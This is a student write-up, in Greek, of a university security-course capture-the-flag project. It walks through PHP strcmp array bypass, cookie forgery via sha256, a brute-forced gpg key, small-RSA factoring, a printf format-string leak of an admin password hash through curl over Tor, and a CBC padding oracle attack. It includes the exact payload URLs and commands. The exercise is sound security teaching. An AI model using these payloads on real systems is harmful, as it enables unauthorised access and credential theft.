## 2022 Project 2

![](logo.png)

Ερωτήσεις:

1. Πού βρίσκεται ο Γιώργος;
1. Τι βρήκε ο Γιώργος;
1. Τι ώρα είναι στο "Plan X";
1. Πού βρίσκονται τα αρχεία του "Plan X";
1. Ποια είναι τα results του "Plan Y";
1. Ποιο είναι το code του "Plan Z";

#### Παρατηρήσεις

- Οι ίδιες ομάδες με την εργασία 1
- Εγγραφή στο github: https://classroom.github.com/a/HTr3OtgA

- Στο τελος του καθε βηματος θα βρισκεται ενα flag με prefix "FLAG={". Για παραδειγμα "**FLAG={ThisIsAFlag}**".
  **Αν το flag δεν εχει το παραπανω format, δεν εχετε τελειωσει ακομα το βημα** (μην στέλνετε claims χωρίς το flag).
- Μόλις ολοκληρώσετε κάθε βήμα στέλνετε claim στο ys13@chatzi.org


- Για τα βήματα 3-6 απαιτείται να γράψετε ένα πρόγραμμα που να αυτοματοποιεί την εύρεση της λύσης.
  Μπορείτε να χρησιμοποιήσετε ό,τι γλώσσα προγραμματισμού θέλετε, αλλά θα πρέπει να μπορώ να το τρέξω
  σε Ubuntu 20.04 χρησιμοποιώντας software που είναι διαθέσιμο στο Ubuntu. Θα πρέπει επίσης
  να φτιάξετε ένα script `run.sh` που εκτελεί το πρόγραμμα με ό,τι παραμέτρους χρειάζονται.
- Επίσης γράφετε report στο README.md με τα βήματα που ακολουθήσατε, και το κάνετε commit μαζί με οποιοδήποτε κώδικα χρησιμοποιήσατε
- Βαθμολογία
    - Η δυσκολία αυξάνεται, ιδιαίτερα στα βήματα 3-6.
    - Για ό,τι δεν ολοκληρώσετε περιγράψτε (και υλοποιήστε στο πρόγραμμα) την πρόοδό σας και πώς θα μπορούσατε να συνεχίσετε.
    - Με τα πρώτα 3 βήματα παίρνετε 5 στο μάθημα (αν έχετε πάει καλά στην εργασία 1)
    - Με τα 3-6 φτάνετε μέχρι το 10 (δεν υπάρχει γραπτή εξέταση)
    - Για τους μεταπτυχιακούς τα 3-6 είναι προαιρετικά. ΔΕΝ αντικαθιστούν το project
     (αλλά μπορούν να λειτουργήσουν προσθετικά στο βαθμό της εργασίας 1)
- Timeline
    - Τις πρώτες 10 μέρες δεν υπάρχου hints.
    - 24/6: αρχίζουν τα hints για τα βήματα 1,2
    - 30/6: deadline για τα βήματα 1,2
    - Για τα βήματα 3-6 δίνονται hints μόνο σε όσους ζητήσουν
    - 14/7: deadline για τα βήματα 3-6
- Οσοι απαντάνε γρήγορα έχουν bonus και μπαίνουν στο HoF

- __Οχι spoilers__
- __Οχι DoS__ ή brute force. Μπορείτε να χρησιμοποιείτε scripts, αλλά όποιος βαράει στα τυφλά μηδενίζεται
   (θέλουμε οι servers να είναι accessible από όλους). Αν δεν είστε σίγουροι αν κάτι επιτρέπεται, απλά ρωτήστε.
   
### Μέλη ομάδας

- [1115201800164, Ιωάννης Ροβιθάκης](mailto:sdi1800164@di.uoa.gr)
- [1115201800083, Φίλιππος Κουμπάρος](mailto:sdi1800083@di.uoa.gr)

## Απαντήσεις

# Ερώτημα 1: Πού βρίσκεται ο Γιώργος;

1. Αρχικά πληκτρολογήσαμε το onion link που ήταν γραμμένο στην φωτογραφία της εκφώνησης στον Tor και οδηγηθήκαμε στην σελίδα **YS13 Fixers** http://2bx6yarg76ryzjdpegl5l76skdlb4vvxwjxpipq4nhz3xnjjh3jo6qyd.onion όπου παρατηρήσαμε αμέσως ότι και οι δύο μας είχαμε το ίδιο visitor number (204) και κατόπιν διερεύνησης και το **ίδιο cookie** πράγμα που κίνησε το ενδιαφέρον μας. Μάλιστα μετά από πειραματισμό συμπεράναμε ότι το cookie αυτό παραμένει **πάντα ίδιο** (η πληροφορία αυτή μας χρησίμευσε τελικά παρακάτω).  Αφού το περιεχόμενο της σελίδας δεν φάνηκε να περιέχει κάποιο άλλο στοιχείο που να μπορούσαμε να εκμεταλλευτούμε, στραφήκαμε στο source code της σελίδας στον inspector στα developer tools του browser. Εκεί εντοπίσαμε το εξής σχόλιο: `
 "Pretty sure this is 100% secure since I followed this very closely for securing my web server:
 https://blog.0day.rocks/securing-a-web-hidden-service-89d935ba1c1d
 Would be a major disaster if someone can pierce my onion security..." `

2. Ακολουθήσαμε τον σύνδεσμο https://blog.0day.rocks/securing-a-web-hidden-service-89d935ba1c1d που μας οδήγησε σε ένα medium article με μέτρα προστασίας για την ανωνυμία ενός onion domain. Διαβάσαμε προσεκτικά το άρθρο καθώς στο παραπάνω σχόλιο ο διαχειριστής του onion domain ανέφερε πως ακολούθησε τις οδηγίες του άρθρου αυτού για να ασφαλίσει την σελίδα του. Δοκιμάσαμε αν έχουν ασφαλιστεί σωστά ένα ένα τα σημεία που αναφέρει το άρθρο και ανακαλύψαμε ήταν ανοιχτή η σελίδα server-info: http://2bx6yarg76ryzjdpegl5l76skdlb4vvxwjxpipq4nhz3xnjjh3jo6qyd.onion/server-info .  Από τη σελίδα αυτή πήραμε αρκετές χρήσιμες πληροφορίες που μας φάνηκαν χρήσιμες:

Ένα ακόμα onion link:
```
In file: /etc/apache2/sites-enabled/personal.conf
9: **ServerName _flffeyo7q6zllfse2sgwh7i5b5apn73g6upedyihqvaarhq5wrkkn7ad**
11: ServerAdmin _webmaster@localhost_
12: DocumentRoot _/var/www/personal_
20: ErrorLog _/var/log/apache2/personal_error.log_
```
 και την ύπαρξη αρχείων phps (php source), τα οποία μετά από έρευνα στο google μάθαμε πως είναι αρχεία php τα οποία δεν εκτελούνται από τον server, απλά τυπώνονται σαν text (οπότε μπορείς να δείς τον php κώδικα)
 ```
In file: /etc/apache2/mods-enabled/php7.0.conf
1: <FilesMatch ".+\.ph(p[3457]?|t|tml)">
2: SetHandler _application/x-httpd-php_
4: **<FilesMatch ".+\.phps$">**
5: SetHandler _application/x-httpd-php-source_
```
3. Ακολουθώντας το νέο onion link που βρήκαμε, βρεθήκαμε στη σελίδα http://flffeyo7q6zllfse2sgwh7i5b5apn73g6upedyihqvaarhq5wrkkn7ad.onion . Στη σελίδα αυτή πατώντας το κουμπί submit, οδηγούμαστε στο αρχείο access.php οπου αντικρίζουμε το μήνυμα `bad user...` οτι κωδικό και αν δοκιμάσουμε. Στο σημείο αυτό, δοκιμάσαμε να δούμε αν υπάρχει access.**phps** ωστε να μπορέσουμε να δούμε με ποιον τρόπο γίνεται το authentication της σελίδας αυτής. 
```
<?php
// get $secret, $desired and $passwd from this file
// i set $desired to the 48th multiple of 7 that contains a 7 in its decimal representation
require_once "secret.php";

if ((((((((((((((((((intval($_GET['user']) !== $desired) || (strlen($_GET['user'])) != 7))))))))))))))))) {
    die("bad user...\n");
}
if ( isset ($_GET[ 'password' ])) {
   if (strcmp($_GET[ 'password' ], $passwd) != 0 ){
     die("bad pass...\n");
   }
}else {
   die("no pass...\n");
}

// authenticated under YS13's dynamic authentication. greet the user!
echo $secret
?>
```
Βλέπουμε ότι για να φτάσουμε στο βήμα ελέγχου κωδικού, πρέπει καταρχάς να είμαστε ο σωστός χρήστης. Για να γίνει αυτό θέλουμε ενα username το οποίο να είναι 7 ψηφία σε μήκος και η αριθμητική του τιμή να είναι ίση με την τιμή του desired (η οποία υπολογίζεται ως το 48ο πολλαπλάσιο του 7 το οποίο περιέχει το 7). Γράψαμε το script 48multi7.py το οποίο υπολόγισε την τιμή του desired ως 1337. Όμως το 1337 δεν είναι 7 χαρακτήρες... στο σημείο αυτό μετά από κάποια πειράματα καταλήξαμε στην τιμή user=0001337 η οποία προσπέρασε επιτυχώς τον έλεγχο χρήστη. Ο κωδικός αν και άγνωστος, ελέγχεται από strcmp οπότε δοκιμάσαμε να δώσουμε το $_GET[ 'password' ] ως αδειο array, με αποτέλεσμα η strcmp να γυρίζει 0 και να περνάμε τον έλεγχο του κωδικού!  ( http://flffeyo7q6zllfse2sgwh7i5b5apn73g6upedyihqvaarhq5wrkkn7ad.onion/access.php?user=0001337&password[]= )

4. Έχοντας περάσει το authentication, οδηγούμαστε στο εξής path http://flffeyo7q6zllfse2sgwh7i5b5apn73g6upedyihqvaarhq5wrkkn7ad.onion/blogposts7589109238/
το οποίο μας οδηγεί σε μια σειρά από blogposts (ειδικά το τελευταίο μας προσφέρει μερικά πολύ ενδιαφέροντα στοιχεία: ένα **github repo** για έναν απλό http server που χρησιμοποιείται από τους στόχους μας, ένα ακόμα **onion link** ( http://xtfbiszfeilgi672ted7hmuq5v7v3zbitdrzvveg2qvtz4ar5jndnxad.onion ) καθώς και μια αναφορά στο εργαλείο **socat**.  Ακολουθώντας το link φαίνεται να βρισκόμαστε σε αδιέξοδο καθώς το μόνο που υπάρχει είναι μια φόρμα για σύνδεση χρήστη. Γυρίζοντας πίσω στα blogposts δοκιμάσαμε μήπως υπάρχουν άλλα diaries (πχ diary3 αλλά χωρίς επιτυχία). Μετά από λίγο ψάξιμο εντοπίσαμε πως το path http://flffeyo7q6zllfse2sgwh7i5b5apn73g6upedyihqvaarhq5wrkkn7ad.onion/blogposts7589109238/blogposts/ δεν έχει κάποιο index.php αρχείο, και μας επιτρέπει να δούμε την λίστα με τα αρχεία που βρίσκονται στον φάκελο blogposts. Εκεί παρατηρήσαμε πως υπάρχει πέρα από τα 2 diaries, και ένα post: ( http://flffeyo7q6zllfse2sgwh7i5b5apn73g6upedyihqvaarhq5wrkkn7ad.onion/blogposts7589109238/blogposts/post3.html ) το οποίο είναι και η πρώτη αναφορά που βρήκαμε για τον Γιώργο. Το ενδιαφέρον στο post αυτό, είναι πως στο post αναφέρεται ενας **winner visitor #834472** γεγονός που άμεσα μας θύμισε το **visitor #204** που είμασε εμείς στην αρχική σελίδα. Ειδικά εφόσον όπως αναφέρθηκε παραπάνω, το visitor number δεν φαίνεται να αλλάζει, σκεφτήκαμε πως το επόμενο λογικό βήμα είναι να προσπαθήσουμε να βρούμε το cookie που αντιστοιχεί στον visitor #834472 ωστε να "συνδεθούμε" σαν αυτόν.

5. Πίσω στην αρχική σελίδα YS13 Fixers το cookie για τον χρήστη #204 είναι το εξής: MjA0OmZjNTZkYmM2ZDQ2NTJiMzE1Yjg2YjcxYzhkNjg4YzFjY2RlYTljNWYxZmQwNzc2M2QyNjU5ZmRlMmUyZmM0OWE= παρατηρώντας τους χαρακτήρες από τους οποίους αποτελείται το cookie  (φαινομενικά ολο το αλφάβητο και '=') υποθέσαμε πως είναι κατι encoded σε Base64 οπότε και δοκιμάσαμε να το κανουμε decode με χρήση ενός online εργαλείου https://www.base64decode.org/ . To decoded cookie είχε την μορφή 204:fc56dbc6d4652b315b86b71c8d688c1ccdea9c5f1fd07763d2659fde2e2fc49a με το πρώτο κομμάτι να είναι προφανώς ο αριθμός χρήστη και το δεύτερο κομμάτι να είναι κάποιο άλλο hash. Από το πλήθος και το είδος των χαρακτήρων του δεύτερου hash (64 φαινομενικά δεκαεξαδικοί χαρακτήρες) υποθέσαμε πως το δεύτερο κομμάτι αποτελεί ένα sha256 hash. Με μια γρήγορη αναζήτηση του hash στο google ("sha256 fc56dbc6d4652b315b86b71c8d688c1ccdea9c5f1fd07763d2659fde2e2fc49a") οδηγηθήκαμε στη σελίδα
https://www.integers.co/questions-answers/what-are-the-different-hash-algorithm-outputs-for-204.html από την οποία μάθαμε πως το hash που αναζητούσαμε ήταν το sha256(204). Συνεπώς, τα cookies των YS13 Fixers προκύπτουν από την εξής φόρμουλα: visitor_number:sha256(visitor_number). Γνωρίζοντας αυτό, χρησιμοποιήσαμε τα online εργαλεία https://emn178.github.io/online-tools/sha256.html https://www.base64encode.org/ για να παράξουμε το cookie του χρήστη #834472: ODM0NDcyOjI3YzNhZjdlZjJiZWUxYWY1MjdkYmY4YzA1YjNkYjZjY2E2MzU4OTk0MWI4ZDQ5NTcyYWE2NGI1Y2Q4YzViOTc= και εισάγοντας το στη θέση του cookie του χρήστη 204, οδηγηθήκαμε στο μήνυμα `### Congrats user #834472!! Check directory /sekritbackup7547 for latest news...`
6. Στη σελίδα http://2bx6yarg76ryzjdpegl5l76skdlb4vvxwjxpipq4nhz3xnjjh3jo6qyd.onion/sekritbackup7547/ βρήκαμε δύο encrypted αρχεία (firefox.log.gpg και signal.log.gpg) καθώς και ένα αρχείο notes.txt με hints για το πώς μπορούμε να κάνουμε decrypt τα αρχεία αυτά.
```
entry #79:
so i recently found this software called gpg which is capable of encrypting my
files, and i came up with a very smart and easy-to-remember way to finally keep
my data secret:
First of all, I generate a random passphrase using the SHA256 hash algorithm,
and then I save it on disk in hex as "passphrase.key". In particular, here is
how to generate the key:
    key = SHA256(<current date in RFC3339 format> + " " + <secret string>)
    e.g. so if the secret string is "cement" then the key would be:
             key = SHA256("2020-05-18 cement") = cadf84c9706ff4866f8af17d3c0e3503da44aea21c2580bd6452f7a1b8b48ed2
Then I use the gpg software to encrypt my files using the passphrase.key file:
    $ gpg --symmetric --passphrase-file passphrase.key --batch plaintext.txt
I then delete all the unencrypted files and the key files and just leave the
encrypted files behind.
XXX don't forget to delete this file, the key and the script before crossing borders
XXX ropsten 0xdcf1bfb1207e9b22c77de191570d46617fe4cdf4dbc195ade273485dddc16783
```
Λόγω προηγούμενης εμπειρίας μας σε blockchain development αναγνωρίσαμε αμέσως το ropsten και το transaction hash στο τέλος του μηνύματος, τα οποία μας οδήγησαν στον explorer του ropsten testnet: https://ropsten.etherscan.io/tx/0xdcf1bfb1207e9b22c77de191570d46617fe4cdf4dbc195ade273485dddc16783 στο tx με το δεδομένο hash. Κάνοντας decode το input data του transaction σαν utf-8 βρήκαμε την λέξη **bigtent** η οποία υποθέσαμε πως ήταν η λέξη που χρειαζόμασταν για το gpg key. Οπότε το μόνο πράγμα που έμενε ήταν η ημερομηνία. Αφού δεν μπορούσαμε να βρούμε πουθενά κάποιο hint για την ημερομηνία, και αφού οι ημερομηνίες είναι σχετικά λίγες σαν πλήθος, αποφασίσαμε να γράψουμε ενα script και να προσπαθήσουμε να κάνουμε brute force το gpg key (brute_force.py) Έτσι, βρήκαμε το κλειδί να είναι το **2021-01-04 bigtent** με το οποίο κάναμε decrypt τα δύο άλλα αρχεία.
- Το firefox.log.gz.gpg περιείχε πάρα πολλές φορές το ίδιο λίνκ https://en.wikipedia.org/wiki/The_Conversation και μέσα σε αυτές ήταν κρυμμένο και αυτό το link  https://github.com/asn-d6/tor
- Το signal.log.gpg περιείχε την εξής συνομιλία :
```
22 Feb 15:18 - You:    Hey Maria :)
23 Mar 20:44 - You:    Maria? I need a favor.
24 Mar 13:32 - You:    Maria, I passed from your place the other day but you were not there. Please call me it's urgent.
24 Mar 13:34 - Maria:  ???
25 Mar 13:35 - You:    HEy Maria! I'm trying to make sense of the inbetweens. I think I'm part of some weird game other people are playing on me...
25 Mar 13:35 - You:    my flat got poisoned by those people and im now sleeping in the balcony.
25 Mar 13:35 - You:    the neighbors are looking at me when i sleep.
25 Mar 13:36 - You:    i saw a girl in the eleveator yesterday holding a plant with big branches. she started talking to me. i didnt naswer. i think.
25 Mar 13:36 - You:    my mobile phone is broken. its tracking me and sending details to those men. i need to send it for repair.
25 Mar 13:37 - You:    i think im not well. need to escape this city. they are looking at me. i dont git why...
25 Mar 13:37 - You:    please come and find me. you are the only person i can commit to: eafb2886b8732d638a3c44a8882d309ae11fa19d
25 Mar 13:38 - You:    hope to see you soon! thanks!>
25 Mar 17:12 - Maria:  ??? What are you talking about? I'm not Maria. I think you got the wrong number mate.
```
- Από την συνομιλία αυτή το ενδιαφέρον μας τράβηξε η χρήση της λέξης commit αντί για trust πχ ακολουθούμενη από ένα hash. Δοκιμάσαμε να αναζητήσουμε το hash αυτό στο github repo το οποίο ήταν στο  λίνκ που είχαμε βρεί κρυμμένο στα firefox logs και βρήκαμε το εξης commit https://github.com/asn-d6/tor/commit/eafb2886b8732d638a3c44a8882d309ae11fa19d το οποίο έχει το εξής σχόλιο
```
/**
* Hey Maria... So I went to the Rivest club again yesterday and met a guy who
* sold me tickets that will take me out of this crazy city. I hope that in a
* few days we will be together again. Find me at:
*
* http://aqwlvm4ms72zriryeunpo3uk7myqjvatba4ikl3wy6etdrrblbezlfqd.onion/y||x||y||x.txt
*
* where || means concatenation
*
******
*
* N = 127670779
* e = 7
*
* E(x) = 32959265
* E(y) = 47487400
*/
```
- Το σχόλιο αυτό φαίνεται να περιγράφει ένα ακόμα κουίζ το οποίο φαίνεται να μας οδηγεί επιτέλους στην τοποθεσία του Γιώργου. Με βάση όσα έχουμε κάνει στο μάθημα τα στοιχεία που μας δίνονται μας οδηγούν σε ένα πρόβλημα αποκρυπτογράφησης RSA χρησιμοποιώντας N=127670779 και e=7 για να αποκρυπτογραφήσουμε τα E(x) και E(y) και να βρούμε το link. Για τον σκοπό αυτό, γράψαμε ένα απλό πρόγραμμα prime.c το οποιο αρχικά βρίσκει τους δύο πρώτους p και q των οποίων το γινόμενο βγάζει τον Ν, και στην συνέχεια τους χρησιμοποιεί για να υπολογίσει τον Φ(n) και τελικά το d. Έχοντας το d, αποκρυπτογραφούμε τα x και y σε 133710 και  74198  αντίστοιχα, τα οποία μας οδηγούν τελικά στο λίνκ http://aqwlvm4ms72zriryeunpo3uk7myqjvatba4ikl3wy6etdrrblbezlfqd.onion/7419813371074198133710.txt το οποίο μας αποκαλύπτει την τοποθεσία του Γιώργου στο **Κιλιμάντζαρο**.

# Ερώτημα 2:  Τι βρήκε ο Γιώργος;

1. Στο τέλος του ερωτήματος 1 εκτός από το flag που μας έλεγε που βρισκόταν ο Γιώργος, είχαμε το όνομα ενός αρχείου jpg το οποίο βρισκόταν στην ίδια σελίδα 
(http://aqwlvm4ms72zriryeunpo3uk7myqjvatba4ikl3wy6etdrrblbezlfqd.onion/kilimanjarotimes4818.jpg), εκεί πέρα έκτος από την πληροφορία ότι ένας Έλληνας ορειβάτης (ο Γιώργος) είχε, χαθεί μαθαίνουμε ότι υπάρχει και ένα αρχείο με το όνομα sss491020.tar.gz. Το αρχείο αυτό βρισκόταν και αυτό στην ίδια σελίδα, συγκεκριμένα στον σύνδεσμο (http://aqwlvm4ms72zriryeunpo3uk7myqjvatba4ikl3wy6etdrrblbezlfqd.onion/sss491020.tar.gz). 

2. Όταν κατεβάσαμε το εν λόγο αρχείο, παρατηρήσαμε ότι δεν μπορούσαμε να το κάνουμε decompress, κάνοντας το cat και είδαμε ότι στην αρχή  υπάρχει το string `pleaseletmesleeppppppppppp!!!!!`. Έτσι, ανοίξαμε το αρχείο sss491020.tar.gz με notepad++, και αφού  αφαιρέσαμε το παραπάνω string από το αρχείο μπορούσαμε να το κάνουμε decompress κανονικά. Το συμπιεσμένο αρχείο περιείχε έναν φάκελο `sss` και μέσα σε αυτόν ένα .git φάκελο, και κατ επέκταση ένα git repository.

3. Στην συνέχεια ανοίξαμε το repository με χρήση της εφαρμογής git ahead όπου βρήκαμε όλα τα branches και το ιστορικό των commits σε αυτά. Τα αρχεία που βρήκαμε ήταν τα έξης;

	-  `notes.txt`: που περίεχε ένα "μήνυμα" από τον Γιώργο. Το μήνυμα αναφέρει 3 κλειδιά "shares" καθώς και κάποιον "Shamir". Γράφοντας "shamir shares" στο google η πρώτη επιλογή είναι o αλγόριθμος  [Shamir's Secret Sharing](https://en.wikipedia.org/wiki/Shamir%27s_Secret_Sharing)  (o οποίος ταίριαζε και με το όνομα του αρχείου "sss"). Διαβάζοντας τη wikipedia κατανοήσαμε πως λειτουργεί ο SSS, και καταλάβαμε ότι θα πρέπει να χρησιμοποιήσουμε τον αλγόριθμο  προκειμένου να βρούμε κάποιο secret με βάση κάποια shares. 
	- `sss.py`: Εδώ πέρα υπάρχει η υλοποίηση με την οποία ο Γιώργος (λογικά) "έκρυψε" το μυστικό στα shares.
	- `polywork.py`: Αρχικά μας φάνηκε σαν το `sss.py` αλλά με περιττές συναρτήσεις, τελικά δεν ήταν καθόλου περιττές καθώς στο τέλος βρήκαμε το μυστικό με χρήση αυτών.
	
4. Προβληματισμένοι για το που μπορούμε να βρούμε τα shares που είχε μοιραστεί Γιώργος αρχίσαμε να ψάχνουμε σε πολλά σημεία της εργασίας. Κάποια στιγμή κοιτάξαμε και το tag που υπήρχε σε ένα commit άλλα το git ahead δεν μας έβγαζε ότι υπήρχε κάποια συγκεκριμένη πληροφορία μέσα σε αυτό. Μετά από πολύ περισσότερη προσπάθεια να βρούμε τα shares επανήλθαμε στο repository καθώς ήταν το μόνο σημείο από το οποίο πιστεύαμε ότι μπορούμε να εξάγουμε κάποια πληροφορία σχετικά με τα shares. Προβληματισμένοι μήπως υπήρχε κάποια πληροφορία στο repo που δεν εμφάνιζε το git ahead, το ανoίξαμε και με sublime merge, όπου και εκεί δεν εμφανίστηκε κάποια επιπλέον πληροφορία και το tag εξακολουθούσε να φαίνεται κενό και σε αυτή την εφαρμογή. Τελικά, όταν δοκιμάσαμε να τυπώσουμε τα tags μέσω terminal με την εντολή
`git tag -n`
εκτυπώθηκε 
```tag  shares:  [5007965719154398295316829646509289701874861709891808846734792385015541826201, 20129353592886270223448727591627806607524309415930743719526720763604786378070, 45364163628598845685938428155401936384627058279694842643445501229807995000756]```

5. Γνωρίζοντας τα shares, αρκούσε πλέον να χρησιμοποιήσουμε την συνάρτηση interpolate_polynomial(), και τροποποιώντας λίγο το αρχείο polywork.py λάβαμε στην έξοδο τους συντελεστές του πολυονύμου που ψάχναμε, και κατα συνέπεια και το secret ( το οποίο σύμφωνα με την wikipedia για το SSS είναι ο σταθερός συντελεστής ) 
```
[7403229901542734320046385667678715161578038025069716094040261345149, 26169192218323911866319064271228080517314772219715007707403479597137589037900, 31274648668553447006902771563420789354571926829126400936865255393776272627665]
```
6. Στη συνέχεια προσπαθήσαμε να βρούμε την σημασία του secret το οποίο υποθέσαμε πως είναι κάποιο text, οπότε και το μετατρέψαμε τον σταθερό συντελεστή (το `7403...5149`) πρώτα σε hex (https://www.rapidtables.com/convert/number/decimal-to-hex.html) και στη συνέχεια σε string (https://codebeautify.org/hex-string-converter) οπότε και βρήκαμε το flag του ερωτήματος αυτού: **FLAG={TimeTravelPossible!!?}**

Input: 7403229901542734320046385667678715161578038025069716094040261345149
In: https://www.rapidtables.com/convert/number/decimal-to-hex.html
Output: 464C41473D7B54696D6554726176656C506F737369626C6521213F7D

Input: 464C41473D7B54696D6554726176656C506F737369626C6521213F7D
In: https://codebeautify.org/hex-string-converter
Output: FLAG={TimeTravelPossible!!?}

# Ερώτημα 3:  Τι ώρα είναι στο "Plan X";

Θέλοντας να συνεχίσουμε την εργασία, η τελευταία πληροφορία που δεν είχαμε αξιοποίησει σε αυτό το σημείο ήταν η διεύθυνση http://xtfbiszfeilgi672ted7hmuq5v7v3zbitdrzvveg2qvtz4ar5jndnxad.onion/ όπου έπρεπε να βρούμε ένα όνομα χρήστη και έναν κωδικό. 

Απο το ίδιο link από το οποίο βρήκαμε τον παραπάνω σύνδεσμο (http://flffeyo7q6zllfse2sgwh7i5b5apn73g6upedyihqvaarhq5wrkkn7ad.onion/blogposts7589109238/blogposts/diary2.html), 
```
I know you all want to learn about my hobbies and interests!

Due to the sensitive nature of my affiliation with the "Plan X" group I'm not just writing this stuff out here for all the creeps to see it.

Fortunately, a valued customer with a cool black hat recently gave me a secure interface for storing sensitive information. He said that it's even open source (github:chatziko/pico) and ultra secure.

The secure Plan X server is up: xtfbiszfeilgi672ted7hmuq5v7v3zbitdrzvveg2qvtz4ar5jndnxad.onion! I can finally sleep feeling safe... Please come by the store (when we open) and ask me for the password first.

socat + onions = perfect recipe
```

μαθαίνουμε ότι αυτή η ιστοσελίδα τρέχει από έναν server pico (github:chatziko/pico). Θέλοντας να εκτελέσουμε τοπικά το pico με σκοπό να βρούμε κάποιες ευπάθειες τις οποίες ενδεχομένως να μπορέσουμε να χρησιμοποιήσουμε, μεταγλωττίσαμε το project, και παρατηρήσαμε το εξής warning:
```
main.c:133:5: warning: format not a string literal and no format arguments [-Wformat-security]
     printf(auth_username);
```
 Στην γραμμή 133 της συνάρτησης main γίνεται κλήση printf με όρισμα μόνο την συμβολοσειρά auth_username, αυτό μας επιτρέπει να βάλουμε οποιαδήποτε ακολουθία χαρακτήρων μέσα στην κλήση της printf, ακόμα και format specifier οπως %s %x. 

Ακόμα, ακολουθώντας την υπόδειξη “socat + onions = perfect recipe”, και μετά από αρκετό πειραματισμό, παρατηρήσαμε ότι μπορούμε να αυτοματοποιήσουμε τον τρόπο που μπορούμε να κάνουμε requests, με χρήση του curl, και συγκεκριμένα με το flag –socks5-hostname στην διεύθυνση 127.0.0.1:9150 ώστε τα request να γίνονται μέσο του tor. Μοναδικό πρόβλημα ήταν πως δεν φαινόταν να λαμβάνουμε κάποια απάντηση για το αν τα username/password που βάζαμε ήταν σωστά ή λάθος (το output της printf που είδαμε παραπάνω). Αυτό λύθηκε όταν ανακαλύψαμε ότι το αποτέλεσμα της printf() εμφανίζονταν στο header της απάντησης, το οποίο στο curl μπορεί να εμφανιστεί με το flag -v. Έτσι η δομή της εντολής curl που χρειαζόμαστε είναι η ακόλουθη:

`curl -v -u username:password --socks5-hostname 127.0.0.1:9150 http://xtfbiszfeilgi672ted7hmuq5v7v3zbitdrzvveg2qvtz4ar5jndnxad.onion/`

```
	...
// check if user is found
if(password_md5 == NULL) {
	printf("HTTP/1.1 401 Unauthorized\r\n");
	printf("WWW-Authenticate: Basic realm=\"");
	printf("Invalid user: ");
	printf(auth_username);   // <--- Buffer overflow 
	printf("\"\r\n\r\n");
	free(auth_decoded);
	return  0;
}
 
// check password's md5
char  auth_password_md5[33];   // <--- Password hash
md5_hex(auth_password, auth_password_md5);
if(strcmp(password_md5, auth_password_md5) != 0) {
	...
```

Επιπρόσθετα, από τον παραπάνω κώδικα ξέραμε ότι το hash για τον κωδικό βρίσκετε μερικές θέσεις μνήμης μακριά από το string  auth_username, και έτσι με χρήση του script curl_for_3.sh κάναμε επαναληπτικά request όπου δίνοντας σαν username string με format specifiers περνάμε πίσω σε ένα μέρος του header, αποτελέσματα buffer overflow. Μέτα από μερικές εκτελέσεις του παραπάνω script είδαμε ότι για username ` "%x %x %x %x %x %x %s" ` *δηλαδή με την εντολή `curl -v -u "%x %x %x %x %x %x %s":password --socks5-hostname 127.0.0.1:9150 http://xtfbiszfeilgi672ted7hmuq5v7v3zbitdrzvveg2qvtz4ar5jndnxad.onion/`* περνάμε σε μέρος του response header το hash `admin:0fba1b57781369f0dcfb5b55e61764fd` το οποίο μετά από googlαρισμα είδαμε ότι αντιστοιχεί στην συμβολοσειρά “hammertime” η οποία είναι και ο κωδικός που ψάχναμε. Bάζοντας username:admin και password:hammertime καταφέραμε να μπούμε στην σελίδα όπου μετά από "κυνηγητό" ενός html κουμπιού βρήκαμε το flag του ερωτήματος: **FLAG={Stop! Hammer Time}**. 

# Ερώτημα 4:  Πού βρίσκονται τα αρχεία του "Plan X";

Όντας πλέον authenticated στη σελίδα http://xtfbiszfeilgi672ted7hmuq5v7v3zbitdrzvveg2qvtz4ar5jndnxad.onion/ βλέπουμε το εξής κείμενο:
```
PlanX files are moved in the safe location: ad8bb176da1f40a98385ad0ae9777c3208b78ae57a7fec84092b2cbbaf2ab1c0  
(this is encrypted of course). You can verify that the encrypted location you got is correct below (make sure you got a version with correct padding):
```
καθως και μια φόρμα που μας επιτρέπει να ελέγξουμε αν κάποιο encrypted hex έχει  σωστό padding.
Το μυστικό είναι κρυπτογραφημένο, και το μόνο στοιχείο που φαίνεται να έχουμε είναι πως μπορούμε να ελέγχουμε αν το "padding" του encrypted text είναι σωστό ή οχι. Αναζητώντας 'encrypted padding attack' στο google σχεδόν όλα τα αποτελέσματα ήταν για το `Padding oracle attack` . 

Αρχικά, κάναμε μια προσεκτική έρευνα στο διαδίκτυο ώστε να κατανοήσουμε τον τρόπο με τον οποίο λειτουργεί η επίθεση αυτή. Κάποιες από τις πηγές που συμβουλευτήκαμε είναι οι:
 - https://robertheaton.com/2013/07/29/padding-oracle-attack/
 - https://research.nccgroup.com/2021/02/17/cryptopals-exploiting-cbc-padding-oracles/
 
Έχοντας κατανοήσει την λογική πίσω από το vulnerability, χρησιμοποιήσαμε αρχικά τον κώδικα που βρήκαμε στον 2ο σύνδεσμο που αναφέραμε, ώστε να δοκιμάσουμε την επίθεση τοπικά σε δικό μας σύστημα πρωτού το δοκιμάσουμε στην σελίδα. Μετά από αρκετές προσθήκες και τροποποιήσεις στον κώδικα  καταλήξαμε στο script padding_oracle.py το οποίο μετά την εκτέλεση του μας έδωσε το flag:  `FLAG={/secet/x}` το οποίο είναι προφανώς το directory στο οποίο βρίσκονται τα σχεδια του plan x.

# Ερώτημα 5: Ποια είναι τα results του "Plan Y";

Έχοντας ολοκληρώσει το ερώτημα 4, δοκιμάσαμε να πλοηγηθούμε στα paths ...nxad.onion/secet/x και αντίστοιχα ...nxad.onion/secet/y (που υποθέσαμε οτι υπάρχει με βάση τον τίτλο του ερωτηματος 5) για να ελέγξουμε εαν μπορούσαμε να βρούμε κάποιο νέο στοιχείο μέσω αυτών, πράγμα αδύνατο, καθώς όπως είδαμε δεν υπήρχε κάποιος handler στον server για τα συγκεκριμένα paths.
Συνεπώς καταλήξαμε σε αδιέξοδο και αρχίσαμε να σκεφτόμαστε με τι τρόπο θα μπορούσαμε να αποκτήσουμε στα αρχεία που βρίσκονται στο path ...nxad.onion/secet/x (και το ...nxad.onion/secet/y αν οντως αποδειχθεί πως υπάρχει). Στο σημείο αυτό σκεφτήκαμε μήπως υπάρχουν κιάλλα vunerabilities στον κώδικα του pico server, όμοια με το buffer overflow της printf() στο ερώτημα 3. Προσπαθήσαμε να βρούμε σημεία στα οποία ο σερβερ να χρησιμοποιεί strings (=buffers), καθώς αυτά είναι και τα σημεία στα οποία είναι πιο πιθανό να βρεθεί κάποιο κενό ασφαλείας λόγω προγραμματιστικής αμέλειας.
